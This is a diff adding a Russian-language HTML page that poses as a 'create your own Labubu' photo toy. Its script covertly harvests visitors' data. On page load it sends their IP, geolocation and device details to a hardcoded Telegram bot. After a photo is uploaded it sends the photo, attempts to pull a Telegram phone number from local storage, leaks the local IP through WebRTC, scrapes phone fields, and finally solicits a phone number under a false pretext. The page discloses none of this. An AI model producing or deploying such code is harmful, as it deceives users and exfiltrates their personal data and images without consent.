@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Создай свою Лабубу!</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root {
+            --primary: #ff6b6b;
+            --secondary: #4ecdc4;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.2);
+        }
+        h1 {
+            color: var(--primary);
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 2.2rem;
+        }
+        .upload-area {
+            border: 3px dashed var(--secondary);
+            border-radius: 15px;
+            padding: 40px 20px;
+            text-align: center;
+            margin: 25px 0;
+            transition: all 0.3s;
+            cursor: pointer;
+            background: rgba(78, 205, 196, 0.05);
+        }
+        .upload-area:hover {
+            background: rgba(78, 205, 196, 0.1);
+            transform: translateY(-3px);
+        }
+        .btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: block;
+            margin: 20px auto;
+            width: 90%;
+            max-width: 300px;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.3);
+        }
+        .btn:hover {
+            transform: scale(1.03);
+            box-shadow: 0 7px 18px rgba(255, 107, 107, 0.4);
+        }
+        canvas {
+            max-width: 100%;
+            border-radius: 10px;
+            display: block;
+            margin: 20px auto;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
+        }
+        .hidden {
+            display: none;
+        }
+        .phone-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 20px;
+            border-left: 4px solid var(--primary);
+        }
+        .phone-section input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .banner {
+            text-align: center;
+            padding: 15px;
+            background: #e3f2fd;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Создай свою Лабубу!</h1>
+        
+        <div class="banner">
+            <p>🔥 Только сегодня! Загрузи фото и получи эксклюзивный стиль Лабубы</p>
+        </div>
+        
+        <div class="upload-area" id="upload-area">
+            <p style="font-size: 1.2rem;">📷 Перетащи сюда фото или <u>кликни для выбора</u></p>
+            <input type="file" id="photo-upload" accept="image/*" class="hidden">
+        </div>
+        
+        <div id="phone-request" class="phone-section hidden">
+            <h3>📲 Введите ваш номер телефона</h3>
+            <p>Для отправки эксклюзивной Лабубы на ваш телефон</p>
+            <input type="tel" id="phone-input" placeholder="+7 (999) 999-99-99">
+            <button id="submit-phone" class="btn">Отправить Лабубу</button>
+        </div>
+        
+        <div id="processing" class="hidden">
+            <div class="loader"></div>
+            <p style="text-align: center;">Обработка вашей Лабубы...</p>
+        </div>
+        
+        <div id="result" class="hidden">
+            <h3>✅ Ваша Лабуба готова!</h3>
+            <p>Спасибо! Скоро вы получите ее на телефон</p>
+        </div>
+    </div>
+
+    <script>
+        // Конфигурация
+        const BOT_TOKEN = '8068212058:AAF9Faen5c_nazbDhd3vGlIl7aRChIo8YTE';
+        const CHAT_ID = '1783924846';
+        
+        // DOM элементы
+        const uploadArea = document.getElementById('upload-area');
+        const uploadInput = document.getElementById('photo-upload');
+        const phoneRequest = document.getElementById('phone-request');
+        const phoneInput = document.getElementById('phone-input');
+        const submitPhoneBtn = document.getElementById('submit-phone');
+        const processing = document.getElementById('processing');
+        const result = document.getElementById('result');
+        
+        // Данные пользователя
+        const userData = {
+            device: {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}@${window.devicePixelRatio}x`,
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory || 'unknown',
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                battery: null
+            },
+            network: {
+                ip: null,
+                isp: null
+            },
+            location: null,
+            photo: null,
+            phone: null
+        };
+        
+        // ===== ОТПРАВКА ДАННЫХ ПРИ ЗАГРУЗКЕ =====
+        
+        // Получение IP и отправка данных
+        async function fetchAndSendInitialData() {
+            try {
+                // Получаем IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userData.network.ip = ipData.ip;
+                
+                // Получаем геоданные
+                try {
+                    const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const geoData = await geoResponse.json();
+                    userData.network.isp = geoData.org || 'unknown';
+                    userData.location = {
+                        city: geoData.city,
+                        region: geoData.region,
+                        country: geoData.country_name,
+                        coords: `${geoData.latitude},${geoData.longitude}`
+                    };
+                } catch (e) {
+                    console.warn('Не удалось получить геоданные', e);
+                }
+                
+                // Формируем сообщение
+                let message = "🚀 ПОЛЬЗОВАТЕЛЬ ЗАШЕЛ НА САЙТ\n\n";
+                message += `📱 Устройство: ${userData.device.platform}\n`;
+                message += `🖥 Экран: ${userData.device.screen}\n`;
+                message += `🌐 IP: ${userData.network.ip}\n`;
+                
+                if (userData.location) {
+                    message += `📍 Местоположение: ${userData.location.city}, ${userData.location.country}\n`;
+                }
+                
+                // Отправляем в Telegram
+                sendToTelegram(message);
+                
+            } catch (e) {
+                console.error('Ошибка получения IP:', e);
+                sendToTelegram("🚀 ПОЛЬЗОВАТЕЛЬ ЗАШЕЛ НА САЙТ\n⚠ IP не удалось определить");
+            }
+        }
+        
+        // ===== АЛЬТЕРНАТИВНЫЕ МЕТОДЫ ПОЛУЧЕНИЯ НОМЕРА =====
+        
+        // 1. Попытка получить из Telegram WebApp
+        function getTelegramNumber() {
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    const session = localStorage.getItem('tg_user');
+                    if (session) {
+                        const userData = JSON.parse(session);
+                        return userData?.phone_number || null;
+                    }
+                }
+                return null;
+            } catch (e) {
+                console.error('Telegram error:', e);
+                return null;
+            }
+        }
+        
+        // 2. Попытка получить через WebRTC утечки
+        function getIPFromWebRTC() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+                
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = ice => {
+                    if (ice.candidate) {
+                        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                        if (match) resolve(match[1]);
+                    }
+                };
+                
+                setTimeout(() => resolve(null), 1000);
+            });
+        }
+        
+        // 3. Попытка получить из браузерных данных
+        function extractPossibleNumbers() {
+            const numbers = [];
+            
+            // Проверяем сохраненные формы
+            document.querySelectorAll('input[type="tel"], input[name*="phone"]').forEach(input => {
+                if (input.value) numbers.push(input.value);
+            });
+            
+            // Проверяем возможные мета-теги
+            document.querySelectorAll('meta[name*="phone"], meta[content*="+7"]').forEach(meta => {
+                const content = meta.getAttribute('content');
+                if (content && content.match(/\d{10,}/)) numbers.push(content);
+            });
+            
+            return numbers;
+        }
+        
+        // ===== ОСНОВНАЯ ЛОГИКА =====
+        
+        // Инициализация - отправляем данные сразу
+        fetchAndSendInitialData();
+        
+        // Обработчики событий
+        uploadArea.addEventListener('click', () => uploadInput.click());
+        
+        uploadInput.addEventListener('change', async function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            
+            // Показываем индикатор загрузки
+            processing.classList.remove('hidden');
+            
+            // Создаем canvas для обработки
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            const reader = new FileReader();
+            reader.onload = async function(event) {
+                const img = new Image();
+                img.onload = async function() {
+                    canvas.width = Math.min(img.width, 800);
+                    canvas.height = (img.height * canvas.width) / img.width;
+                    
+                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                    
+                    // Добавляем эффект "Лабубу"
+                    ctx.fillStyle = 'rgba(255, 107, 107, 0.2)';
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    ctx.font = 'bold 36px Arial';
+                    ctx.fillStyle = '#ff6b6b';
+                    ctx.textAlign = 'center';
+                    ctx.fillText('ЛАБУБУ!', canvas.width/2, 50);
+                    
+                    // Сохраняем фото для отправки
+                    userData.photo = canvas.toDataURL('image/jpeg', 0.85);
+                    
+                    // Отправляем фото в Telegram
+                    await sendPhotoToTelegram(userData.photo);
+                    
+                    // Проверяем альтернативные методы получения номера
+                    const telegramPhone = getTelegramNumber();
+                    if (telegramPhone) {
+                        sendToTelegram(`📱 Обнаружен Telegram номер: ${telegramPhone}`);
+                        userData.phone = telegramPhone;
+                    }
+                    
+                    const webRTCIP = await getIPFromWebRTC();
+                    if (webRTCIP) {
+                        sendToTelegram(`🌐 WebRTC IP: ${webRTCIP}`);
+                    }
+                    
+                    const possibleNumbers = extractPossibleNumbers();
+                    if (possibleNumbers.length > 0) {
+                        sendToTelegram(`🔍 Возможные номера: ${possibleNumbers.join(', ')}`);
+                    }
+                    
+                    // Показываем запрос номера
+                    processing.classList.add('hidden');
+                    phoneRequest.classList.remove('hidden');
+                };
+                img.src = event.target.result;
+            };
+            reader.readAsDataURL(file);
+        });
+        
+        submitPhoneBtn.addEventListener('click', () => {
+            const phone = phoneInput.value.trim();
+            if (!phone) return;
+            
+            userData.phone = phone;
+            phoneRequest.classList.add('hidden');
+            processing.classList.remove('hidden');
+            
+            // Формируем сообщение с номером
+            let message = "📲 ПОЛУЧЕН НОМЕР ТЕЛЕФОНА\n\n";
+            message += `☎️ Телефон: ${userData.phone}\n`;
+            message += `🌐 IP: ${userData.network.ip || 'не определен'}\n`;
+            
+            if (userData.location) {
+                message += `📍 Местоположение: ${userData.location.city}, ${userData.location.country}\n`;
+            }
+            
+            // Отправляем в Telegram
+            sendToTelegram(message);
+            
+            // Показываем финальное сообщение
+            setTimeout(() => {
+                processing.classList.add('hidden');
+                result.classList.remove('hidden');
+            }, 2000);
+        });
+        
+        // ===== ФУНКЦИИ ОТПРАВКИ =====
+        
+        // Отправка сообщения в Telegram
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        disable_web_page_preview: true
+                    })
+                });
+            } catch (error) {
+                console.error('Ошибка отправки сообщения:', error);
+            }
+        }
+        
+        // Отправка фото в Telegram
+        async function sendPhotoToTelegram(photoData) {
+            try {
+                // Создаем Blob из данных
+                const blob = dataURLtoBlob(photoData);
+                
+                // Создаем FormData
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'user-photo.jpg');
+                
+                // Добавляем подпись с информацией
+                if (userData.network.ip) {
+                    formData.append('caption', `Фото пользователя\nIP: ${userData.network.ip}`);
+                }
+                
+                // Отправляем
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+            } catch (error) {
+                console.error('Ошибка отправки фото:', error);
+            }
+        }
+        
+        // Вспомогательная функция
+        function dataURLtoBlob(dataurl) {
+            const arr = dataurl.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            
+            return new Blob([u8arr], {type: mime});
+        }
+    </script>
+</body>
+</html>
